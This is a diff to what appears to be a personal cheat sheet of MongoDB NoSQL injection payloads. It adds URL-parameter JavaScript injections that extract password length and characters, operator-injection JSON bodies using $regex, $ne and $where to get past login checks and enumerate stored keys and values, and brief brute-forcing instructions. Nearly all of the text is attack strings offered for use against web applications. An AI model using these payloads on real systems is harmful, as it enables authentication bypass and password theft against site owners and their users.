@@ -5,5 +5,20 @@
 
 #MongoDB Data Retrieving
 
-' && this.password.length < 50%00 >> For extracting password length
-' && this.password[0] == 'a'%00 >> For extracting password
+' && this.password.length < 50%00 >> For extracting password length in URL
+' && this.password[0] == 'a'%00 >> For extracting password in URL
+
+#Operator Injection To Retrieving Unknown Data
+
+{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"}}
+{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  >>  {"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"1"}}
+{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  >>  {"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"Object.keys(this)[0].match('^{0}.*')"}}
+{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  >>  {"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"Object.keys(this)[0].match('^{0}0.*')"}}
+
+Object.keys(this)[0].match('^{0}s.*') >> To identify data size. Ex: Password
+Object.keys(this)[0].match('^{0}0.*') >> To fetch the data
+
+1st 0 means key number
+2nd 0 means data size
+3rd 0 means data character
+For bruteforcing select only 2nd and 3rd 0
